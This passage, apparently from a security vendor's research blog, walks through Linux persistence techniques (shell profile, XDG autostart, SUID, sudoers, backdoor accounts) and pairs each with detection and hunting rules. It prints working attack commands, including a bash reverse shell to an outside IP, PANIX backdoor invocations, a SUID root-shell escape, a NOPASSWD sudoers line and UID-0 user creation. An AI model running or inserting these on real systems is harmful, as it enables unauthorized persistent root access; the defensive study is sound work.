<p>For non-login interactive shell initialization, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bashrc</code> is executed. Typically, to ensure this configuration file is also executed on login, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bashrc</code> is sourced within <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_profile</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_login</code> or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.profile</code>. Additionally, a backdoor can be added to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_logout</code> configuration file for persistence upon shell termination.</p>
<p>When planting a backdoor in one of these files, it is important not to make mistakes in the execution chain, meaning that it is both important to pick the correct configuration file and to pick a fitting payload. A typical reverse shell connection will make the terminal freeze while sending the reverse shell connection to the background will make it malfunction. A potential payload could look like this:</p>
<pre><code>(nohup bash -i &gt; /dev/tcp/192.168.1.1/1337 0&lt;&amp;1 2&gt;&amp;1 &amp;)</code></pre>
<p>This command uses “nohup” (no hang up) to run an interactive bash reverse shell as a background process, ensuring it continues running even after the initiating user logs out. The entire command is then executed in the background using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&amp;</code> and wrapped in parentheses to create a subshell, preventing any interference with the parent shell’s operations.</p>
<p>Be vigilant for other types of backdoors, such as credential stealers that create fake “<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">[sudo] password for…</code>” prompts when running sudo or the execution of malicious binaries. MITRE specifies more information and real-world examples related to this technique in <a href="https://attack.mitre.org/techniques/T1546/004/">T1546.004</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1546004---shell-profile-modification" class="absolute -top-32"></span>Persistence through T1546.004 - shell profile modification</h3>
<p>You can add a bash payload to shell configuration files either manually or using PANIX. When PANIX runs with user privileges, it establishes persistence by modifying <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.bash_profile</code>. With root privileges, it modifies the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/profile</code> file to achieve system-wide persistence.</p>
<pre><code>sudo ./panix.sh --shell-profile --default --ip 192.168.1.1 --port 2004</code></pre>
<p>To trigger it, either log in as root via the shell with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">su --login root</code> or login via SSH. The shell profile will be parsed and executed in order, resulting in the following chain of execution:</p>
<p></p>
<p>PANIX plants the backdoor in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/profile</code>, next <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">su --login root</code> is executed to trigger the payload, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">UID</code>/<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GID</code> changes to root, and a network connection is initiated through the injected backdoor. A similar process occurs when logging in via SSH. We can detect several steps of the attack chain.</p>
<p>Detection and endpoint rules that cover shell profile modification persistence_</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_shell_configuration_modification.toml">Shell Configuration Creation or Modification</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_binary_execution_from_unusual_location_through_shell_profile.toml">Binary Execution from Unusual Location through Shell Profile</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_network_connection_through_shell_profile.toml">Network Connection through Shell Profile</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1546004---shell-configuration-modification" class="absolute -top-32"></span>Hunting for T1546.004 - shell configuration modification</h3>
<p>We can hunt for shell profile file creations/modification, as well as SSHD child processes, by leveraging ES|QL and OSQuery. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_shell_modification_persistence.toml">Shell Modification Persistence</a> hunting rule contains several of these hunting queries.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1547013---boot-or-logon-autostart-execution-xdg-autostart-entries" class="absolute -top-32"></span>T1547.013 - boot or logon autostart execution: XDG autostart entries</h2>
<p>Cross-Desktop Group (XDG) is a set of<a href="https://specifications.freedesktop.org/autostart-spec/autostart-spec-latest.html"> standards for Unix desktop environments</a> that describe how applications should be started automatically when a user logs in. The XDG Autostart specification is particularly interesting, as it defines a way to automatically launch applications based on desktop entry files, which are plain text files with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.desktop</code> extension.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.desktop</code> files are typically used to configure how applications appear in menus and how they are launched. By leveraging XDG Autostart, attackers can configure malicious applications to run automatically whenever users log into their desktop environment.</p>
<p>The location where these files can be placed varies based on whether the persistence is being established for all users (system-wide) or a specific user. It also depends on the desktop environment used; for example, KDE has other configuration locations than Gnome. Default system-wide autostart files are located in directories that require root permissions to modify, such as:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/xdg/autostart/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/share/autostart/</code></li>
</ul>
<p>Default user-specific autostart files, other than the root user-specific autostart file, only require user-level permissions. These are typically located in:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.config/autostart/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.local/share/autostart/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.config/autostart-scripts/ (not part of XDG standard, but used by KDE)</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/root/.config/autostart/*</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/root/.local/share/autostart/</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/root/.config/autostart-scripts/</code></li>
</ul>
<p>An example of a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.desktop</code> file that executes a binary whenever a user logs in looks like this:</p>
<pre><code>[Desktop Entry]
Type=Application
Exec=/path/to/malicious/binary
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=Updater</code></pre>
<p>Volexity recently published research on <a href="https://www.volexity.com/blog/2024/06/13/disgomoji-malware-used-to-target-indian-government/">DISGOMOJI</a> malware, which was found to establish persistence by dropping a <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.desktop</code> file in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.config/autostart/</code> directory, which would execute a malicious backdoor planted on the system. As it can be established with both user/root privileges, it is an interesting candidate for automated persistence implementations. Additionally, more information and real-world examples related to this technique are specified by MITRE in <a href="https://attack.mitre.org/techniques/T1547/013/">T1547.013</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1547013---cross-desktop-group-xdg" class="absolute -top-32"></span>Persistence through T1547.013 - Cross-Desktop Group (XDG)</h3>
<p>You can determine coverage and dynamically analyze this technique manually or through PANIX. When analyzing this technique, make sure XDG is available on your testing system, as it is designed to be used on systems with a GUI (XDG can also be used without a GUI). When PANIX runs with user privileges, it establishes persistence by modifying <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.config/autostart/user-dirs.desktop</code> to execute <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">~/.config/autostart/.user-dirs</code> and achieve user-specific persistence. With root privileges, it modifies <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/xdg/autostart/pkc12-register.desktop</code> to execute <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/xdg/pkc12-register</code> and achieve system-wide persistence.</p>
<pre><code>sudo ./panix.sh --xdg --default --ip 192.168.1.1 --port 2005
[+] XDG persistence established.</code></pre>
<p>After rebooting the system and collecting the logs, the following events will be present for a GNOME-based system.</p>
<p></p>
<p>We can see PANIX creating the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/xdg/autostart</code> directory and the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">pkc12-register/pkc12-register.desktop</code> files. It grants execution privileges to the backdoor script, after which persistence is established. When the user logs in, the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.desktop</code> files are parsed, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/libexec/gnome-session-binary</code> executes its contents, which in turn initiates the reverse shell connection. Here, again, we can detect several parts of the attack chain.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_kde_autostart_modification.toml">Persistence via KDE AutoStart Script or Desktop File Modification</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_xdg_autostart_netcon.toml">Network Connections Initiated Through XDG Autostart Entry</a></td></tr></tbody></table></div>
<p>Again, the file category has two different rules: the former focuses on creation/modification using Elastic Defend, while the latter focuses on modification through FIM.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1547013---xdg-autostart-entries" class="absolute -top-32"></span>Hunting for T1547.013 - XDG autostart entries</h3>
<p>Hunting for persistence through XDG involves XDG <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.desktop</code> file creations in known locations and unusual child processes spawned from a session-manager parent through ES|QL and OSQuery. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_xdg_autostart_modifications.toml">XDG Persistence</a> hunting rule contains several queries to hunt for XDG persistence.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1548001---abuse-elevation-control-mechanism-setuid-and-setgid" class="absolute -top-32"></span>T1548.001 - abuse elevation control mechanism: setuid and setgid</h2>
<p><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">Set Owner User ID (SUID)</a> and <a href="https://man7.org/linux/man-pages/man2/setgid.2.html">Set Group ID (SGID)</a> are Unix file permissions allowing users to run executables with the executable’s owner or group permissions, respectively. When the SUID bit is set on an executable owned by the root user, any user running the executable gains root privileges. Similarly, when the SGID bit is set on an executable, it runs with the permissions of the group that owns the file.</p>
<p>Typical targets for SUID and SGID backdoors include common system binaries like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">find</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">vim</code>, or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bash</code>, frequently available and widely used. <a href="https://gtfobins.github.io/#+suid">GTFOBins</a> provides a list of common Unix binaries that can be exploited to obtain a root shell or unauthorized file reads. System administrators must be cautious when managing SUID and SGID binaries, as improperly configured permissions can lead to significant security vulnerabilities.</p>
<p>To exploit this, either a misconfigured SUID or SGID binary must be present on the system, or root-level privileges must be obtained to create a backdoor. Typical privilege escalation enumeration scripts enumerate the entire filesystem for the presence of these binaries using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">find</code>.</p>
<p>SUID and SGID binaries are common on Linux and are available on the system by default. Generally, these cannot be exploited. An example of a misconfigured SUID binary looks like this:</p>
<pre><code>find / -perm -4000 -type f -exec ls -la {} \;
-rwsr-sr-x 1 root root 1396520 Mar 14 11:31 /bin/bash</code></pre>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/bash</code> binary is not a default SUID binary and causes a security risk. An attacker could now run <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/bash -p</code> to run bash and keep the root privileges on execution. More information on this is available at <a href="https://gtfobins.github.io/gtfobins/bash/">GTFOBins</a>. Although MITRE defines this as privilege escalation/defense evasion, it can (as shown) be used for persistence as well. More information by MITRE on this technique is available at <a href="https://attack.mitre.org/techniques/T1548/001/">T1548.001</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1548001---setuid-and-setgid" class="absolute -top-32"></span>Persistence through T1548.001 - setuid and setgid</h3>
<p>This method requires root privileges, as it sets the SUID bit to a set of executables:</p>
<pre><code>sudo ./panix.sh --suid --default
[+] SUID privilege granted to /usr/bin/find
[+] SUID privilege granted to /usr/bin/dash
[-] python is not present on the system.
[+] SUID privilege granted to /usr/bin/python3</code></pre>
<p>After setting SUID permissions to the binary, it can be executed in a manner that will allow the user to keep the root privileges:</p>
<pre><code>
/usr/bin/find . -exec /bin/sh -p \; -quit
whoami
root</code></pre>
<p>Looking at the events this generates, we can see a discrepancy between the user ID and real user ID:</p>
<p></p>
<p>After executing PANIX with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code>, SUID permissions were granted to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/find</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/dash</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/python3</code> using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">chmod</code>. Subsequently, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/usr/bin/find</code> was utilized to run <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/bin/sh</code> with privileged mode (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-p</code>) to obtain a root shell. Typically, the real user ID of a process matches the effective user ID. However, there are exceptions, such as when using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">su</code>, or, as demonstrated here, a SUID binary, where the real user ID differs. Using our knowledge of GTFOBins and the execution chain, we can detect several indicators of SUID and SGID abuse.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/discovery_suid_sguid_enumeration.toml">SUID/SGUID Enumeration Detected</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/privilege_escalation_potential_suid_sgid_exploitation.toml">Setuid / Setgid Bit Set via chmod</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_setuid_setgid_bit_set_via_chmod.toml">Privilege Escalation via SUID/SGID</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1548001---setuid-and-setgid" class="absolute -top-32"></span>Hunting for T1548.001 - setuid and setgid</h3>
<p>The simplest and most effective way of hunting for SUID and SGID files is to search the filesystem for these files through OSQuery and take note of unusual ones. The <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_suid_binaries.toml">OSQuery SUID Hunting</a> rule can help you to hunt for this technique.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1548003---abuse-elevation-control-mechanism-sudo-and-sudo-caching-sudoers-file-modification" class="absolute -top-32"></span>T1548.003 - abuse elevation control mechanism: sudo and sudo caching (sudoers file modification)</h2>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo</code> command allows users to execute commands with superuser or other user privileges. The sudoers file manages <a href="https://linux.die.net/man/5/sudoers">sudo permissions</a>, which dictates who can use sudo and what commands they can run. The main configuration file is located at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/sudoers</code>.</p>
<p>This file contains global settings and user-specific rules for sudo access. Additionally, there is a directory used to store additional sudoers configuration files at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/sudoers.d/</code>. Each file in this directory is treated as an extension of the main sudoers file, allowing for modular and organized sudo configurations.</p>
<p>Both system administrators and threat actors can misconfigure the sudoers file and its extensions. A common accidental misconfiguration might be overly permissive rules that grant users more access than necessary. Conversely, a threat actor with root access can deliberately modify these files to ensure they maintain elevated access.</p>
<p>An example of a misconfiguration or backdoor that allows an attacker to run any command as any user without a password prompt looks like this:</p>
<pre><code>Attacker ALL=(ALL) NOPASSWD:ALL</code></pre>
<p>By exploiting such misconfigurations, an attacker can maintain persistent root access. For example, with the above backdoored configuration, the attacker can gain a root shell by executing <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo /bin/bash</code>. Similarly to the previous technique, this technique is also classified as privilege escalation/defense evasion by MITRE. Of course, this is again true, but it is also a way of establishing persistence. More information on T1548.003 can be found <a href="https://attack.mitre.org/techniques/T1548/003/">here</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1548003---sudoers-file-modification" class="absolute -top-32"></span>Persistence through T1548.003 - sudoers file modification</h3>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo -l</code> command can be used to list out the allowed (and forbidden) commands for the user on the current host. By default, a non-root user cannot run any commands using sudo without specifying a password.</p>
<pre><code>sudo -l
[sudo] password for attacker:</code></pre>
<p>Let’s add a backdoor entry for the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">attacker</code> user:</p>
<pre><code>sudo ./panix.sh --sudoers --username attacker
[+] User attacker can now run all commands without a sudo password.</code></pre>
<p>After adding a backdoor in the sudoers file and rerunning the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo -l</code> command, we see that the attacker can now run any command on the system with sudo without specifying a password.</p>
<pre><code>&gt; sudo -l
&gt; User attacker may run the following commands on ubuntu-persistence-research:
&gt;  (ALL : ALL) ALL
&gt;  (ALL) NOPASSWD: ALL</code></pre>
<p>After planting this backdoor, not much traces are left behind, other than the creation of the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/sudoers.d/attacker</code> file.</p>
<p></p>
<p>This backdoor can also be established by adding to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/sudoers</code> file, which would not generate a file creation event. This event can be captured via FIM.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_sudoers_file_mod.toml">Sudoers File Modification</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/cross-platform/privilege_escalation_echo_nopasswd_sudoers.toml">Potential Privilege Escalation via Sudoers File Modification</a></td></tr></tbody></table></div>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="hunting-for-t1548003---sudoers-file-modification" class="absolute -top-32"></span>Hunting for T1548.003 - sudoers file modification</h3>
<p>OSQuery provides a module that displays all sudoers files and rules through a simple and effective live hunt, available at <a href="https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/privilege_escalation_via_existing_sudoers.toml">Privilege Escalation Identification via Existing Sudoers File</a>.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1098t1136---account-manipulationcreation" class="absolute -top-32"></span>T1098/T1136 - account manipulation/creation</h2>
<p>Persistence can be established through the creation or modification of user accounts. By manipulating user credentials or permissions, attackers can ensure long-term access to a compromised system. This section covers various methods of achieving persistence through user account manipulation. MITRE divides this section into <a href="https://attack.mitre.org/techniques/T1098/">T1098</a> (account manipulation) and <a href="https://attack.mitre.org/techniques/T1136/">T1136</a> (create account).</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1136001---create-account-local-account" class="absolute -top-32"></span>T1136.001 - create account: local account</h3>
<p>Creating a new user account is a straightforward way to establish persistence. An attacker with root privileges can add a new user, ensuring they maintain access to the system even if other backdoors are removed. For example:</p>
<pre><code>useradd -m -s /bin/bash backdooruser
echo &#x27;backdooruser:password&#x27; | chpasswd</code></pre>
<p>This creates a new user called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">backdooruser</code> with a password of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">password</code>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1098---account-manipulation-user-credential-modification" class="absolute -top-32"></span>T1098 - account manipulation: user credential modification</h3>
<p>Modifying the credentials of an existing user can also provide persistent access. This might involve changing the password of a privileged user account.</p>
<pre><code>echo &#x27;targetuser:newpassword&#x27; | chpasswd</code></pre>
<p>This changes the password for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">targetuser</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">newpassword</code>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1098---account-manipulation-direct-etcpasswd-file-modification" class="absolute -top-32"></span>T1098 - account manipulation: direct /etc/passwd file modification</h3>
<p>Directly writing to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/passwd</code> file is another method for modifying user accounts. This approach allows attackers to manually add or modify user entries, potentially avoiding detection.</p>
<pre><code>echo &quot;malicioususer:&lt;openssl-hash&gt;:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</code></pre>
<p>Where <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&lt;;openssl-hash&gt;</code> is a hash that can be generated through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">openssl passwd &quot;$password&quot;.</code></p>
<p>The command above creates a new user <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">malicioususer</code>, adds them to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">sudo group</code>, and sets a password. Similarly, this attack can be performed on the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/shadow</code> file, by replacing the hash for a user’s password with a known hash.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1136001---create-account-backdoor-user-creation" class="absolute -top-32"></span>T1136.001 - create account: backdoor user creation</h3>
<p>A backdoor user is a user account created or modified specifically to maintain access to the system. This account often has elevated privileges and is intended to be difficult to detect. One method involves creating a user with a UID of 0, effectively making it a root-equivalent user. This approach is detailed in a blog post called <a href="https://embracethered.com/blog/posts/2021/linux-user-uid-zero-backdoor/">Backdoor users on Linux with uid=0</a>.</p>
<pre><code>useradd -ou 0 -g 0 -m -d /root -s /bin/bash backdoorroot
echo &#x27;backdoorroot:password&#x27; | chpasswd</code></pre>
<p>This creates a new user <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">backdoorroot</code> with UID 0, giving it root privileges.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1098---account-manipulation-user-added-to-privileged-group" class="absolute -top-32"></span>T1098 - account manipulation: user added to privileged group</h3>
<p>Adding an existing user to a privileged group, such as the sudo group, can elevate their permissions, allowing them to execute commands with superuser privileges.</p>
<pre><code>usermod -aG sudo existinguser</code></pre>
<p>This adds <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">existinguser</code> to the sudo group.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="persistence-through-t1098t1136---account-manipulationcreation" class="absolute -top-32"></span>Persistence through T1098/T1136 - account manipulation/creation</h3>
<p>All of these techniques are trivial to execute manually, but they are also built into PANIX in case you want to analyze the logs using a binary rather than a manual action. As the events generated by these techniques are not very interesting, we will not analyze them individually. We detect all the techniques described above through a vast set of detection rules.</p>
